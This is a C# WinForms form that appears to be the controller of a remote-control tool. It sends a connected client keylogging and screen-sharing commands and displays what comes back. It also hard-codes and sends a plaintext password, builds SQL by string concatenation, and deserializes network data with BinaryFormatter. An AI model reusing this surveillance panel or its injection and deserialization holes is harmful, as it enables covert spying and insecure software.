using Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace Server
{
    public partial class ManageForm : Form
    {


        TcpClient client;
        TcpClient klogClient;
        TcpClient ShareScreenClient;


        private NetworkStream CommandStream;
        private NetworkStream ShareScreenStream;
        Thread ShowThread;

        
        public ManageForm(TcpClient k, TcpClient ss, TcpClient m)
        {
            klogClient = k;
            ShareScreenClient = ss;
            client = m;
            CommandStream = m.GetStream();
            //sendShare();

            //Send password;
            string password = "123456";
            string secret = "pass:" + password;
            byte[] data = Encoding.ASCII.GetBytes(secret);

            //save Pass to database
            string remoteEndPoint = client.Client.RemoteEndPoint.ToString();
            string[] parts = remoteEndPoint.Split(':');

            string ipAddress = parts[0];
            string port = parts[1];

            //LoadPass2Dtb(ipAddress, port, password);

            CommandStream.Write(data, 0, data.Length);

            InitializeComponent();
        }

        void LoadPass2Dtb(string ip, string port, string pass)
        {
            SqlConnection connection = new SqlConnection(@"Data Source=DESKTOP-TOI9180\NIKOTINE;Initial Catalog=Pass;Integrated Security=True");

            SqlCommand command = new SqlCommand(@"INSERT INTO [dbo].[table_1]
           ([IP]
           ,[port]
           ,[password])
        VALUES
            ('" + ip + "','" + port + "','" + pass + "')", connection
             );
            connection.Open();
            command.ExecuteNonQuery();
            connection.Close();
        }

        void sendShare()
        {
            byte[] data = Encoding.ASCII.GetBytes("Share-Screen");
            CommandStream.Write(data, 0, data.Length);
            
        }

        private void Menu_Tab_Load(object sender, EventArgs e)
        {
            //Hiển thị toàn màn hình: 
            int w = Screen.PrimaryScreen.Bounds.Width;
            int h = Screen.PrimaryScreen.Bounds.Height;
            this.Location = new Point(0, 0);
            this.Size = new Size(w, h);
        }
         
        private void Key_logger_Click(object sender, EventArgs e)
        {
            try
            {
                CommandStream = client.GetStream();
                byte[] data = Encoding.ASCII.GetBytes("Key-log");
                CommandStream.Write(data, 0, data.Length);

                Form Klg = new KeyLogger(klogClient);
                Klg.Show();
                
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                
            }
        }
        private void share_screen_Click(object sender, EventArgs e)
        {
            try
            {
                CommandStream = client.GetStream();
                byte[] data = Encoding.ASCII.GetBytes("Share-Screen");
                CommandStream.Write(data, 0, data.Length);

                ShowThread = new Thread(ScreenShow);
                ShowThread.Start();
                ShowThread.IsBackground = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);

            }
        }
        /*                if(isShowThreadAlive == false)
                {
                    CommandStream = client.GetStream();
                    byte[] data = Encoding.ASCII.GetBytes("Share-Screen");
                    CommandStream.Write(data, 0, data.Length);

                    share_screen.Text = "Stop share";

                    ShowThread = new Thread(ScreenShow);
                    ShowThread.Start();
                    ShowThread.IsBackground = true;
                    isShowThreadAlive = true;
                }
                else
                {
                    CommandStream = client.GetStream();
                    byte[] data = Encoding.ASCII.GetBytes("Stop-Share-Screen");
                    CommandStream.Write(data, 0, data.Length);

                    share_screen.Text = "Share Screen";

                    ShowThread.Abort();
                    ScreenPicture.Image = null;
                    isShowThreadAlive = false;
                }
        */
        private void ScreenShow()
        {

            try
            {
                BinaryFormatter binaryFormatter = new BinaryFormatter();

                while (client.Connected && Thread.CurrentThread.IsAlive)
                {
                    ShareScreenStream = ShareScreenClient.GetStream();
                    ScreenPicture.Image = (Image)binaryFormatter.Deserialize(ShareScreenStream);
                }
            }
            catch
            {
                MessageBox.Show("Client disconnected");
                EndConnect();
            }
        }

        void EndConnect()
        {
            if (client != null)
            {
                client.Close();
                client = null;
            }
            if (ShareScreenStream != null)
            {
                ShareScreenStream.Close();
                ShareScreenStream = null;
            }
            if (ShowThread != null)
            {
                ShowThread.Abort();
                ShowThread = null;
            }
            Application.Exit();
        }


    }
}
